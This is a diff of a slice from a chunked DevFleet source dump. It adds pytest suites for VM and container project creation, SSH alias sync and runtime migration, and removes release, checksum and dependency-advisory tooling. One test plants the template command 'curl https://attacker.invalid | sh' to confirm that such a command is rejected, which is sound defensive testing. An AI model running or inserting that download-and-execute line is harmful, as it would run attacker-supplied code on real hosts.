@@ -1,10 +1,314 @@
 # DevFleet source part 102
 
 Full-source UTF-8 byte interval [4696500, 4743000); read in order. This is a contiguous text slice, so a code fence/file may continue across parts.
-Payload SHA-256: a61513c1c105ef8785bada7b833575c1df1fcc7eac6af6b5cfa6a246f269f4e7
+Payload SHA-256: 22a2ece66d8829fb2133da09036a0304c994638059e1d938d4c5fe5fae4e2564
 
 <!-- BEGIN SOURCE SLICE -->
-_project_runtime(slug, "vm", "small")
+es
+    assert not any("node_modules" in name for name in names)
+
+
+def test_host_agent_backup_and_export_share_generated_directory_exclusions():
+    source = (ROOT / "windows/DevFleet-HostAgent.ps1").read_text(encoding="utf-8")
+    assert "function New-VerifiedRemoteWorkspaceArchive" in source
+    assert 'excluded = {"node_modules", ".next", "build", "dist", ".venv", "venv", ".pytest_cache", "__pycache__", ".test-runtime"}' in source
+    assert source.count("New-VerifiedRemoteWorkspaceArchive $Record.vm_name $remoteArchive") >= 2
+    assert all(operation in source for operation in ("'list-backups'", "'inspect-backup'", "'restore-backup'"))
+
+```
+
+
+## FILE: source/tests/test_v124_vm_creation_ssh.py
+
+SHA256: 705b439b834162d0890b8b4b4bb42ed66dc300e76b409de537520323dd8ebe6c | Bytes: 6592 | Git mode: 100644
+
+```
+import json
+import shutil
+import uuid
+from pathlib import Path
+
+import pytest
+
+import devfleet.projects as projects
+from devfleet.core import SETTINGS
+
+
+def _template(project: Path, _name: str) -> None:
+    control = project / ".devfleet"
+    control.mkdir(parents=True, exist_ok=True)
+    (control / "template.json").write_text(json.dumps({
+        "bootstrap_command": "./.devfleet/bootstrap.sh",
+        "health_command": "./.devfleet/health-check.sh",
+        "test_command": "./.devfleet/smoke-test.sh",
+    }), encoding="utf-8")
+
+
+def _template_metadata(_name: str) -> dict:
+    return {"language": "python", "framework": "fastapi", "language_rationale": "test", "template_maturity": "stable"}
+
+
+def _prepare(monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setattr(projects, "_copy_template", _template)
+    monkeypatch.setattr(projects, "template_metadata", _template_metadata)
+
+
+def test_vm_create_returns_coherent_metadata_and_syncs_host_alias(monkeypatch: pytest.MonkeyPatch):
+    slug = f"v124-vm-create-{uuid.uuid4().hex[:8]}"
+    shutil.rmtree(SETTINGS.workspaces / slug, ignore_errors=True)
+    _prepare(monkeypatch)
+    calls: list[tuple] = []
+    runtime_id = f"devfleet-project-{slug}"
+    monkeypatch.setattr(projects.VmRuntimeOperations, "ensure", staticmethod(lambda _slug, _meta: {"runtime_id": runtime_id, "address": "10.0.0.44", "state": "ready"}))
+    monkeypatch.setattr(projects, "import_project_workspace", lambda *_args, **_kwargs: {"ok": True, "workspace_preserved": True, "address": "10.0.0.44"})
+    monkeypatch.setattr(projects, "sync_project_vm_ssh_alias", lambda slug, runtime_id, *, project_id: calls.append((slug, runtime_id, project_id)) or {"validated": True})
+
+    result = projects.create_project(slug, template="generic", runtime_isolation="vm", use_ollama=False)
+
+    for key in ("project_id", "slug", "runtime_isolation", "runtime_provider", "runtime_id", "runtime_address", "ssh_alias", "workspace_host", "workspace_path", "resource_profile", "resource_limits", "provisioning_status", "lifecycle_status", "health_status", "health_scope"):
+        assert key in result
+    assert result["runtime_isolation"] == "vm"
+    assert result["runtime_provider"] == "multipass-host-agent"
+    assert result["runtime_id"] == result["ssh_alias"] == runtime_id
+    assert result["runtime_address"] == result["workspace_host"] == "10.0.0.44"
+    assert result["provisioning_status"] == result["lifecycle_status"] == "ready"
+    assert result["health_status"] == "unknown"
+    assert result["health_scope"] == "workspace-ready-not-app-healthy"
+    assert calls == [(slug, result["runtime_id"], result["project_id"])]
+    shutil.rmtree(SETTINGS.workspaces / slug, ignore_errors=True)
+
+
+def test_container_create_returns_metadata(monkeypatch: pytest.MonkeyPatch):
+    slug = f"v124-container-create-{uuid.uuid4().hex[:8]}"
+    shutil.rmtree(SETTINGS.workspaces / slug, ignore_errors=True)
+    _prepare(monkeypatch)
+
+    result = projects.create_project(slug, template="generic", runtime_isolation="container", use_ollama=False)
+
+    assert isinstance(result, dict)
+    assert result["slug"] == slug
+    assert result["runtime_isolation"] == "container"
+    assert result["runtime_provider"] == "docker-compose"
+    assert result["provisioning_status"] == result["lifecycle_status"] == "ready"
+    shutil.rmtree(SETTINGS.workspaces / slug, ignore_errors=True)
+
+
+def test_worktree_to_vm_is_rejected_before_provider_ensure(monkeypatch: pytest.MonkeyPatch):
+    token = uuid.uuid4().hex[:8]
+    source_slug, destination_slug = f"v124-worktree-source-{token}", f"v124-worktree-vm-{token}"
+    source, destination = SETTINGS.workspaces / source_slug, SETTINGS.workspaces / destination_slug
+    shutil.rmtree(source, ignore_errors=True)
+    shutil.rmtree(destination, ignore_errors=True)
+    (source / ".git").mkdir(parents=True)
+    ensured: list[object] = []
+    monkeypatch.setattr(projects.VmRuntimeOperations, "ensure", staticmethod(lambda *_args: ensured.append(True)))
+
+    with pytest.raises(ValueError, match="Worktree-to-VM provisioning is blocked"):
+        projects.create_project(destination_slug, template="generic", runtime_isolation="vm", worktree_source=source_slug, worktree_branch="feature", use_ollama=False)
+
+    assert ensured == []
+    assert not destination.exists()
+    shutil.rmtree(source, ignore_errors=True)
+
+
+def test_host_control_alias_operation_is_fixed_and_structured(monkeypatch: pytest.MonkeyPatch):
+    import devfleet.host_control as host_control
+
+    received: dict = {}
+    monkeypatch.setattr(host_control, "host_control_request", lambda operation, payload, *, runtime_id: received.update(operation=operation, payload=payload, runtime_id=runtime_id) or {"ok": True})
+
+    assert host_control.sync_project_vm_ssh_alias("v124-alias", "devfleet-project-v124-alias", project_id="12345678-1234-1234-1234-123456789abc") == {"ok": True}
+    assert received == {"operation": "sync-ssh-alias", "payload": {"slug": "v124-alias", "project_id": "12345678-1234-1234-1234-123456789abc"}, "runtime_id": "devfleet-project-v124-alias"}
+
+
+def test_host_agent_readiness_probe_runs_with_required_privilege():
+    root = Path(__file__).resolve().parents[1]
+    script = (root / "windows" / "DevFleet-HostAgent.ps1").read_text(encoding="utf-8")
+
+    assert "@('exec',$VmName,'--','sudo','/usr/local/sbin/devfleet-project-health')" in script
+    assert "@('exec',$SourceVm,'--','sudo','tar','-czf',$sourceArchive" in script
+    assert "@('exec',$record.vm_name,'--','sudo','find',$targetPath" in script
+    assert "@('exec',$Record.vm_name,'--','sudo','-u','devrunner','bash','--noprofile','--norc','-lc'" in script
+    assert "exec $cmd" in script
+    assert "workspace boundary validation failed" in script
+    assert '$keyProperty="    ssh_authorized_keys:`n      - \'$key\'"' in script
+    assert "Configured DevFleet SSH public key is not available" in script
+
+
+def test_vm_runtime_compatibility_facade_routes_trusted_commands(monkeypatch: pytest.MonkeyPatch):
+    import devfleet.runtime as runtime
+
+    received: dict = {}
+    monkeypatch.setattr(runtime.VM_RUNTIME, "command", lambda slug, metadata, operation, *, command_key="", tail=150: received.update(slug=slug, metadata=metadata, operation=operation, command_key=command_key, tail=tail) or {"ok": True})
+
+    assert runtime.VmRuntimeOperations.command("demo", {"project_id": "id"}, "project-test", command_key="test", tail=42) == {"ok": True}
+    assert received == {"slug": "demo", "metadata": {"project_id": "id"}, "operation": "project-test", "command_key": "test", "tail": 42}
+
+```
+
+
+## FILE: source/tests/test_v125_jobfinder_hotfix.py
+
+SHA256: f8f3e5ce386a3ce3b8c85a0514a09bbb702e935f716e4cd5e8b3c98e44f3b0da | Bytes: 12515 | Git mode: 100644
+
+```
+import json
+from pathlib import Path
+
+import pytest
+
+import devfleet.projects as projects
+from devfleet import host_control, main
+from devfleet.core import SETTINGS
+
+
+LIFECYCLE = {
+    "start_command": "docker compose up -d --build",
+    "stop_command": "docker compose down --remove-orphans",
+    "restart_command": "docker compose restart",
+    "rebuild_command": "docker compose build && docker compose up -d",
+    "logs_command": "docker compose logs",
+}
+PROJECT_ID = "12345678-1234-1234-1234-123456789abc"
+
+
+def _legacy_project(slug: str, template_root: Path, *, exact: bytes | None = None) -> Path:
+    project = SETTINGS.workspaces / slug
+    (project / ".devfleet").mkdir(parents=True, exist_ok=True)
+    (project / "compose.yaml").write_text("services:\n  app:\n    image: ubuntu:24.04\n", encoding="utf-8")
+    metadata = {
+        "schema_version": 2,
+        "managed_by": "devfleet",
+        "slug": slug,
+        "identity": slug,
+        "project_id": PROJECT_ID,
+        "host_id": SETTINGS.node_name,
+        "template": "typescript-next",
+        "runtime_isolation": "container",
+        "runtime_type": "container",
+        "runtime_provider": "docker-compose",
+        "resource_profile": "small",
+        "lifecycle_status": "stopped",
+        "bootstrap_command": "./.devfleet/bootstrap.sh",
+        "health_command": "./.devfleet/health-check.sh",
+    }
+    payload = exact if exact is not None else json.dumps(metadata, separators=(",", ":")).encode()
+    (project / ".devfleet" / "project.json").write_bytes(payload)
+    (project / ".devfleet" / "template.json").write_text(json.dumps({"id": "typescript-next"}), encoding="utf-8")
+    canonical = template_root / "typescript-next" / ".devfleet"
+    canonical.mkdir(parents=True, exist_ok=True)
+    (canonical / "template.json").write_text(json.dumps({"id": "typescript-next", **LIFECYCLE}), encoding="utf-8")
+    return project
+
+
+def _migration_mocks(monkeypatch: pytest.MonkeyPatch, slug: str, *, source_running: bool = False):
+    calls: list[str] = []
+    monkeypatch.setattr(projects, "running", lambda _project: source_running)
+    monkeypatch.setattr(projects, "backup_project", lambda _slug: json.dumps({"backup_status": "verified", "backup_id": "provider-backup", "backup_sha256": "a" * 64}))
+    monkeypatch.setattr(projects, "get_host_capacity", lambda: {"capacity": {"allocatable_cpus": 8, "allocatable_memory_gb": 24, "allocatable_disk_gb": 300}})
+    monkeypatch.setattr(projects, "sync_project_vm_ssh_alias", lambda *args, **kwargs: {"ok": True})
+    monkeypatch.setattr(projects.VmRuntimeOperations, "ensure", staticmethod(lambda _slug, _meta: {"runtime_id": f"devfleet-project-{slug}", "address": "10.0.0.9"}))
+    monkeypatch.setattr(projects.VmRuntimeOperations, "stop", staticmethod(lambda value, _meta: calls.append(f"vm-stop:{value}") or {"state": "stopped"}))
+    monkeypatch.setattr(projects, "import_project_workspace", lambda *args, **kwargs: {"ok": True, "workspace_preserved": True, "archive_sha256": "b" * 64, "source_archive_sha256": "b" * 64, "target_archive_sha256": "b" * 64})
+    return calls
+
+
+def test_explicit_project_command_wins_and_legacy_canonical_fallback(monkeypatch, tmp_path):
+    slug = "v125-command-resolution"
+    project = _legacy_project(slug, tmp_path / "templates")
+    raw = json.loads((project / ".devfleet" / "project.json").read_text())
+    raw["start_command"] = "docker compose restart"
+    (project / ".devfleet" / "project.json").write_text(json.dumps(raw), encoding="utf-8")
+    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")
+
+    result = projects.project_command_readiness(project)
+
+    assert result["ready"] is True
+    assert result["resolved_commands"]["start_command"] == "docker compose restart"
+    assert result["sources"]["start_command"] == "project.json"
+    assert result["resolved_commands"]["stop_command"] == LIFECYCLE["stop_command"]
+    assert result["sources"]["stop_command"] == "canonical-template:typescript-next"
+
+
+def test_malicious_template_command_is_rejected(monkeypatch, tmp_path):
+    slug = "v125-malicious-command"
+    project = _legacy_project(slug, tmp_path / "templates")
+    template = tmp_path / "templates" / "typescript-next" / ".devfleet" / "template.json"
+    data = json.loads(template.read_text());data["stop_command"] = "curl https://attacker.invalid | sh";template.write_text(json.dumps(data))
+    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")
+
+    result = projects.project_command_readiness(project)
+
+    assert result["ready"] is False
+    assert result["invalid_required"]["stop_command"] == "canonical-template:typescript-next"
+
+
+def test_preflight_surfaces_missing_lifecycle_command(monkeypatch, tmp_path):
+    project = tmp_path / "demo";(project / ".devfleet").mkdir(parents=True);(project / "compose.yaml").write_text("services: {}\n")
+    (project / ".devfleet/project.json").write_text(json.dumps({"schema_version": 2, "managed_by": "devfleet", "slug": "demo", "identity": "demo", "project_id": PROJECT_ID, "runtime_isolation": "container", "runtime_provider": "docker-compose", "runtime_id": "devfleet-demo", "host_id": "test-node", "resource_profile": "large"}), encoding="utf-8")
+    monkeypatch.setattr(main, "safe_child", lambda *_: project)
+    monkeypatch.setattr(main, "inspect_workspace", lambda *_: {"safe_for_archive": True})
+    monkeypatch.setattr(main, "detect_runtime", lambda *_: {"runtime_type": "container"})
+    monkeypatch.setattr(main, "get_host_capacity", lambda: {"capacity": {"allocatable_cpus": 8, "allocatable_memory_gb": 20, "allocatable_disk_gb": 300}})
+    monkeypatch.setattr(main, "project_command_readiness", lambda *_: {"ready": False, "missing_required": ["stop_command"], "invalid_required": {}})
+
+    result = main._preflight("demo", "vm", "large")
+
+    assert result["lifecycle_commands_ready"] is False
+    assert result["migration_ready"] is False
+    assert any("stop_command" in blocker for blocker in result["blockers"])
+
+
+def test_stopped_legacy_container_import_stops_vm_not_application(monkeypatch, tmp_path):
+    slug = "v125-jobfinder-stopped"
+    _legacy_project(slug, tmp_path / "templates")
+    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")
+    calls = _migration_mocks(monkeypatch, slug, source_running=False)
+    monkeypatch.setattr(projects, "stop_project", lambda *_: pytest.fail("stopped-source path must not invoke application stop"))
+
+    result = projects.assign_project_runtime(slug, "vm", "small")
+    saved = projects.load_meta(SETTINGS.workspaces / slug)
+
+    assert result["application_health"] == "not-run-stopped"
+    assert calls == [f"vm-stop:{slug}"]
+    assert saved["lifecycle_status"] == "stopped"
+    assert all(saved[key] == value for key, value in LIFECYCLE.items())
+
+
+def test_running_container_still_uses_start_and_health_workflow(monkeypatch, tmp_path):
+    slug = "v125-running-workflow"
+    project = _legacy_project(slug, tmp_path / "templates")
+    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")
+    calls = _migration_mocks(monkeypatch, slug, source_running=True)
+    monkeypatch.setattr(projects, "stop_project", lambda value: calls.append(f"source-stop:{value}") or "stopped")
+
+    def start(value):
+        calls.append(f"destination-start:{value}")
+        meta = projects.load_meta(project);meta["lifecycle_status"] = "running";meta["health_status"] = "healthy";projects.atomic_json(projects.metadata_path(project), meta)
+        return "started"
+
+    monkeypatch.setattr(projects, "start_project", start)
+    monkeypatch.setattr(projects, "runtime_health", lambda *_: {"ok": True, "healthy": True})
+    monkeypatch.setattr(projects, "health_project", lambda *_: "healthy")
+
+    result = projects.assign_project_runtime(slug, "vm", "small")
+
+    assert result["application_health"] == "healthy"
+    assert f"source-stop:{slug}" in calls and f"destination-start:{slug}" in calls
+    assert not any(call.startswith("vm-stop:") for call in calls)
+
+
+def test_rollback_restores_legacy_metadata_bytes_exactly(monkeypatch, tmp_path):
+    slug = "v125-exact-rollback"
+    template_root = tmp_path / "templates"
+    project = _legacy_project(slug, template_root)
+    original = (project / ".devfleet" / "project.json").read_bytes()
+    monkeypatch.setattr(projects, "TEMPLATE_ROOT", template_root)
+    _migration_mocks(monkeypatch, slug)
+    monkeypatch.setattr(projects.VmRuntimeOperations, "ensure", staticmethod(lambda *_: (_ for _ in ()).throw(RuntimeError("injected provision failure"))))
+
+    with pytest.raises(RuntimeError, match="injected provision failure"):
+        projects.assign_project_runtime(slug, "vm", "small")
 
     assert (project / ".devfleet" / "project.json").read_bytes() == original
 
@@ -662,304 +966,4 @@ $zip = [IO.Compression.ZipFile]::Open($output, [IO.Compression.ZipArchiveMode]::
 try {
     foreach ($root in @($source, $installer)) {
         foreach ($file in Get-ChildItem -LiteralPath $root -Recurse -File | Sort-Object FullName) {
-            $relative = ([Uri]::new(($root.TrimEnd('\') + '\')).MakeRelativeUri([Uri]::new($file.FullName)).ToString()).Replace('/','/')
-            if ($excluded | Where-Object { $relative -match $_ }) { continue }
-            $entryName = $relative
-            if ($seen.ContainsKey($entryName)) {
-                if ($root -eq $installer -and $entryName -eq 'dependencies.json') { continue }
-                $existingHash = $seen[$entryName]
-                $currentHash = (Get-FileHash -LiteralPath $file.FullName -Algorithm SHA256).Hash
-                if ($existingHash -ne $currentHash) { throw "Source archive collision with different contents: $entryName" }
-                continue
-            }
-            $entry = $zip.CreateEntry($entryName, [IO.Compression.CompressionLevel]::Optimal)
-            $input = [IO.File]::OpenRead($file.FullName); $outputStream = $entry.Open()
-            try { $input.CopyTo($outputStream) } finally { $outputStream.Dispose(); $input.Dispose() }
-            $seen[$entryName] = (Get-FileHash -LiteralPath $file.FullName -Algorithm SHA256).Hash
-        }
-    }
-} finally { $zip.Dispose() }
-$result = Get-Item -LiteralPath $output
-Write-Host "Installer source archive generated: $output ($($result.Length) bytes)"
-
-```
-
-
-## FILE: source/tools/Verify-Package.ps1
-
-SHA256: 823ed5d1f17bf4b46a0f8f306ff73833df46ab50221734ff5116a8cac7e84cec | Bytes: 3453 | Git mode: 100644
-
-```
-[CmdletBinding()]
-param([switch]$SkipChecksums)
-$ErrorActionPreference='Stop'
-$root=Split-Path -Parent $PSScriptRoot
-$required=@('VERSION','README-FIRST.md','Upgrade-DevFleet.ps1','DevFleet-v1.1.0-MIGRATION.md','DevFleet-v1.1.0-VALIDATION.md','DevFleet-v1.1.0-FILE-CHANGES.md','config\devfleet.config.json','config\ollama-profiles.json','client\Configure-SSH.ps1','client\Configure-DockerContext.ps1','windows\Migrate-Config.ps1','windows\Configure-Ollama.ps1','windows\Set-DevFleetDockerMode.ps1','linux\devfleet-switch-docker-mode','app\devfleet\main.py','docs\13-PERFORMANCE-TUNING.md')
-foreach($r in $required){if(-not(Test-Path(Join-Path $root $r))){throw "Missing $r"}}
-$errors=@();Get-ChildItem $root -Recurse -File|Where-Object Extension -in @('.ps1','.psm1')|ForEach-Object{$tokens=$null;$parse=$null;[void][System.Management.Automation.Language.Parser]::ParseFile($_.FullName,[ref]$tokens,[ref]$parse);foreach($e in $parse){$errors+="$($_.FullName):$($e.Extent.StartLineNumber): $($e.Message)"}};if($errors){throw "PowerShell parsing failed:`n$($errors -join "`n")"}
-$jsonErrors=@();Get-ChildItem $root -Recurse -File -Filter *.json|Where-Object{$_.FullName -notmatch '[\\/](\.git|\.pytest_cache|\.test-runtime|__pycache__|runtime-migrations)[\\/]'}|ForEach-Object{try{[void](Get-Content $_.FullName -Raw|ConvertFrom-Json)}catch{$jsonErrors+="$($_.FullName): $($_.Exception.Message)"}};if($jsonErrors){throw "JSON parsing failed:`n$($jsonErrors -join "`n")"}
-$version=(Get-Content -LiteralPath (Join-Path $root 'VERSION') -Raw).Trim();$cfg=Get-Content (Join-Path $root 'config\devfleet.config.json') -Raw|ConvertFrom-Json;if([int]$cfg.SchemaVersion -ne 2 -or [string]$cfg.PackageVersion -ne $version){throw "Default configuration is not schema 2 / v$version."}
-$transientPackageParts=@('.git','.pytest_cache','.test-runtime','__pycache__','runtime-migrations','outputs','audit-extract');$bad=Get-ChildItem $root -Recurse -File|Where-Object{$relative=$_.FullName.Substring($root.Length).TrimStart([char]92,[char]47).Replace([char]92,[char]47);$parts=$relative.Split('/');$generated=($parts|Where-Object{$_ -eq '.venv' -or $_ -like '.venv-*' -or $transientPackageParts -contains $_}).Count -gt 0;(-not $generated) -and $_.Length -eq 0 -and $_.Name -ne '__init__.py'};if($bad){throw "Unexpected empty files: $($bad.FullName -join ', ')"}
-if(-not $SkipChecksums){$manifest=Join-Path $root 'CHECKSUMS.sha256';foreach($line in Get-Content $manifest){if($line -notmatch '^([0-9a-f]{64})  (.+)$'){continue};$expected=$Matches[1];$rel=$Matches[2].Replace('/','\');$path=Join-Path $root $rel;if(-not(Test-Path $path)){throw "Missing checksum target $rel"};$actual=(Get-FileHash $path -Algorithm SHA256).Hash.ToLowerInvariant();if($actual -ne $expected){$bytes=[IO.File]::ReadAllBytes($path);$hasLoneCr=$false;for($i=0;$i -lt $bytes.Length;$i++){if($bytes[$i] -eq 13 -and ($i+1 -ge $bytes.Length -or $bytes[$i+1] -ne 10)){$hasLoneCr=$true;break}};if(-not $hasLoneCr -and ($bytes -contains 13)){$normalized=[Text.Encoding]::UTF8.GetBytes(([Text.Encoding]::UTF8.GetString($bytes) -replace "`r`n", "`n"));$sha=[Security.Cryptography.SHA256]::Create();try{$actual=([BitConverter]::ToString($sha.ComputeHash($normalized))).Replace('-','').ToLowerInvariant()}finally{$sha.Dispose()}}};if($actual -ne $expected){throw "Checksum mismatch $rel"}}}
-Write-Host 'Package structure, PowerShell AST syntax, JSON/schema, and checksums verified.' -ForegroundColor Green
-
-```
-
-
-## FILE: source/tools/build_release.py
-
-SHA256: 59e38747a1c410ea7710b522c5bb2dab73adb841e892503c87114aed97dc5712 | Bytes: 8017 | Git mode: 100644
-
-```
-"""Reproducible DevFleet TAR and portable bundle builder."""
-from __future__ import annotations
-
-import argparse
-import gzip
-import hashlib
-import json
-import re
-import stat
-import tarfile
-import zipfile
-from pathlib import Path
-
-from hook_modes import executable_template_hooks, hook_mode_manifest
-
-TRANSIENT = {".git", ".pytest_cache", ".test-runtime", "__pycache__", "runtime-migrations"}
-
-
-def is_transient_part(part: str) -> bool:
-    return part in TRANSIENT or part.startswith(".venv")
-
-
-def files(root: Path) -> list[Path]:
-    candidates = (
-        p
-        for p in root.rglob("*")
-        if p.is_file()
-        and not any(is_transient_part(part) for part in p.relative_to(root).parts)
-    )
-    return sorted(
-        candidates,
-        key=lambda path: path.relative_to(root).as_posix().encode("utf-8"),
-    )
-
-
-def sha256(path: Path) -> str:
-    digest = hashlib.sha256()
-    with path.open("rb") as stream:
-        for chunk in iter(lambda: stream.read(1024 * 1024), b""):
-            digest.update(chunk)
-    return digest.hexdigest()
-
-
-def write_checksums(root: Path) -> None:
-    manifest = root / "CHECKSUMS.sha256"
-    lines = [f"{sha256(path)}  {path.relative_to(root).as_posix()}" for path in files(root) if path != manifest]
-    # Keep the tracked manifest byte-identical to a Git archive on Windows;
-    # newline translation here would make a frozen commit unreproducible.
-    manifest.write_text("\n".join(lines) + "\n", encoding="utf-8", newline="\n")
-
-
-def build_tar(root: Path, output: Path) -> set[str]:
-    hooks = executable_template_hooks(root)
-    with output.open("wb") as raw, gzip.GzipFile(filename="", mode="wb", fileobj=raw, mtime=0) as compressed, tarfile.open(fileobj=compressed, mode="w") as archive:
-        for path in files(root):
-            rel = path.relative_to(root).as_posix()
-            info = archive.gettarinfo(str(path), arcname=rel)
-            info.mode = 0o755 if rel in hooks else 0o644
-            info.mtime = 0; info.uid = 0; info.gid = 0; info.uname = "root"; info.gname = "root"
-            with path.open("rb") as stream:
-                archive.addfile(info, stream)
-    return hooks
-
-
-def portable_metadata(entries: list[tuple[str, bytes]], version: str, nested_tar: Path, root: Path) -> list[tuple[str, bytes]]:
-    nested_tar_name = nested_tar.name
-    current_source = [("source/" + path.relative_to(root).as_posix(), path.read_bytes()) for path in files(root)]
-    source_names = [name for name, _ in current_source]
-    source_hashes = [{"path": name, "sha256": sha256_bytes(data)} for name, data in current_source]
-    manifest = {"version": version, "file_count": len(source_names), "files": source_hashes}
-    canonical_docs = {
-        "README.md": (
-            f"# DevFleet Safe Remote Development v{version}\n\n"
-            f"This is the clean-room v{version} portable bundle. The TAR is the authoritative POSIX-mode artifact.\n\n"
-            f"Verify `CHECKSUMS.sha256`, then run `python source/tools/verify_package.py --archive {nested_tar_name}` from the extracted bundle root.\n"
-        ).encode(),
-        "CLEAN-ROOM-VERIFICATION.md": (
-            f"# DevFleet {version} clean-room verification\n\n"
-            "Extract this ZIP into a fresh directory. From the extracted bundle root, run:\n\n"
-            f"`python source/tools/verify_package.py --archive {nested_tar_name}`\n\n"
-            "The command must complete successfully before the portable package is accepted.\n"
-        ).encode(),
-        "DIRECTORY-LAYOUT.md": (
-            f"# DevFleet {version} portable layout\n\n"
-            f"`source/` contains the complete canonical source. `{nested_tar_name}` preserves the release source and trusted POSIX hook modes.\n"
-        ).encode(),
-    }
-    rebuilt: list[tuple[str, bytes]] = []
-    for name, data in entries:
-        if name.startswith("devfleet-v1.2.") and name.endswith(".tar.gz"):
-            continue
-        if name.startswith("source/"):
-            continue
-        if name in {"portable-codebase-manifest.json", "portable-codebase-sha256.txt", "source-tree-manifest.json", "source-tree-sha256.txt"}:
-            continue
-        if name in canonical_docs:
-            continue
-        rebuilt.append((name, data))
-    rebuilt.extend(canonical_docs.items())
-    rebuilt.append((nested_tar_name, nested_tar.read_bytes()))
-    rebuilt.extend(current_source)
-    rebuilt.append(("portable-codebase-manifest.json", json.dumps(manifest, indent=2).encode()))
-    rebuilt.append(("source-tree-manifest.json", json.dumps({"version": version, "file_count": len(source_names), "files": source_hashes}, indent=2).encode()))
-    rebuilt.append(("source-tree-sha256.txt", ("\n".join(f"{item['sha256']}  {item['path']}" for item in source_hashes) + "\n").encode()))
-    rebuilt.append(("portable-codebase-sha256.txt", ("\n".join(f"{sha256_bytes(data)}  {name}" for name, data in sorted(rebuilt, key=lambda item: item[0].encode("utf-8")) if name not in {"portable-codebase-sha256.txt"}) + "\n").encode()))
-    _assert_portable_instruction_identity(rebuilt, version, nested_tar_name)
-    return rebuilt
-
-
-def sha256_bytes(data: bytes) -> str:
-    return hashlib.sha256(data).hexdigest()
-
-
-def _assert_portable_instruction_identity(entries: list[tuple[str, bytes]], version: str, nested_tar_name: str) -> None:
-    instruction_names = {"README.md", "CLEAN-ROOM-VERIFICATION.md", "DIRECTORY-LAYOUT.md"}
-    stale_version = re.compile(r"(?:DevFleet\s+v|devfleet-v)(\d+\.\d+\.\d+)")
-    for name, data in entries:
-        if name not in instruction_names:
-            continue
-        text = data.decode("utf-8", errors="strict")
-        for match in stale_version.finditer(text):
-            context = text[max(0, match.start() - 80):match.end() + 80].lower()
-            if match.group(1) != version and "historical" not in context:
-                raise ValueError(f"Portable release instruction {name} contains an unapproved prior release identity.")
-        if name == "CLEAN-ROOM-VERIFICATION.md" and nested_tar_name not in text:
-            raise ValueError(f"Portable clean-room instructions do not name {nested_tar_name}.")
-
-
-def main() -> None:
-    global args, root
-    parser = argparse.ArgumentParser()
-    parser.add_argument("--source", type=Path, required=True)
-    parser.add_argument("--old-portable", type=Path, required=True)
-    parser.add_argument("--output-dir", type=Path, required=True)
-    args = parser.parse_args()
-    root = args.source.resolve()
-    args.output_dir.mkdir(parents=True, exist_ok=True)
-    (root / "CHECKSUMS.sha256").unlink(missing_ok=True)
-    write_checksums(root)
-    version = (root / "VERSION").read_text(encoding="utf-8").strip()
-    tar = args.output_dir / f"devfleet-v{version}.tar.gz"
-    hooks = build_tar(root, tar)
-    with zipfile.ZipFile(args.old_portable) as source_zip:
-        entries = [(item.filename, source_zip.read(item.filename)) for item in source_zip.infolist() if not item.is_dir()]
-    portable = args.output_dir / f"DevFleet-v{version}-Portable-Codebase-Verified-r1.zip"
-    rebuilt = portable_metadata(entries, version, tar, root)
-    with zipfile.ZipFile(portable, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as out:
-        for name, data in sorted(rebuilt, key=lambda item: item[0].encode("utf-8")):
-            info = zipfile.ZipInfo(name)
-            mode = 0o755 if name.removeprefix("source/") in hooks else 0o644
-            info.create_system = 3  # Unix origin; required for standard unzip mode restoration.
-            info.external_attr = (stat.S_IFREG | mode) << 16
-            out.writestr(info, data)
-    manifest = hook_mode_manifest(root); manifest.update({"version": version, "mode": "0755"})
-    (args.output_dir / "hook-mode-manifest.json").write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")
-    print(json.dumps({"tar": str(tar), "portable": str(portable), "hook_count": len(hooks), "tar_sha256": sha256(tar), "portable_sha256": sha256(portable)}, indent=2))
-
-
-if __name__ == "__main__":
-    main()
-
-```
-
-
-## FILE: source/tools/check_dependency_advisories.py
-
-SHA256: 8901ed5ad3d19846030f2c6b8af5f03274277ef76b641b540a127d9994906185 | Bytes: 11275 | Git mode: 100644
-
-```
-"""Reproducible OSV freshness gate for the exact DevFleet dependency lock."""
-from __future__ import annotations
-
-import argparse
-import hashlib
-import json
-import sys
-import urllib.error
-import urllib.request
-from datetime import datetime, timezone
-from pathlib import Path
-
-from packaging.markers import Marker
-from packaging.requirements import InvalidRequirement, Requirement
-from packaging.utils import canonicalize_name
-
-try:
-    from cvss import CVSS2, CVSS3, CVSS4
-    from cvss.exceptions import CVSSError
-except ImportError as exc:  # pragma: no cover - exercised by release preflight
-    raise RuntimeError(
-        "release dependency gate requires the pinned 'cvss' release-tool dependency"
-    ) from exc
-
-
-OSV_QUERY_URL = "https://api.osv.dev/v1/query"
-TIMEOUT_SECONDS = 8
-HIGH_SCORE = 7.0
-CRITICAL_SCORE = 9.0
-KNOWN_SEVERITIES = {"NONE", "LOW", "MEDIUM", "MODERATE", "HIGH", "CRITICAL"}
-BLOCKING_SEVERITIES = {"HIGH", "CRITICAL", "UNKNOWN"}
-
-
-def _logical_requirement_lines(lock: Path) -> list[str]:
-    """Return requirement expressions from a pip-compile style lock.
-
-    Hashes and pip-compile annotations are deliberately ignored.  A continued
-    marker expression is retained, while a continued requirement is finalized
-    before the next top-level package line.
-    """
-    expressions: list[str] = []
-    pending: str | None = None
-    for physical in lock.read_text(encoding="utf-8").splitlines():
-        line = physical.strip()
-        if not line or line.startswith("#") or line.startswith("--hash="):
-            continue
-        # pip-compile may emit other option continuations; none are part of the
-        # PEP 508 requirement we need to query.
-        if line.startswith("--"):
-            continue
-        if " #" in line:
-            line = line.split(" #", 1)[0].rstrip()
-        if not line:
-            continue
-        if pending is not None:
-            if line.startswith(";") or line.startswith(","):
-                pending = f"{pending} {line}"
-                if pending.endswith("\\"):
-                    pending = pending[:-1].rstrip()
-                continue
-            expressions.append(pending)
-            pending = None
-        if line.endswith("\\"):
-            pending = line[:-1].rstrip()
-        else:
-            expressions.append(line)
-    if pending is not None:
-        expressions.append(pending)
-    return expressions
-
-
-def _requirement_expression(line: str) -> tuple[str, str, str | None]:
-    try:
-        requirement = Requirement(line)
-    except InvalidRequirement as exc:
-        raise ValueError(f"unsupported lock requirement: {line!r}") from exc
-    specifiers = list(requirement.specifier)
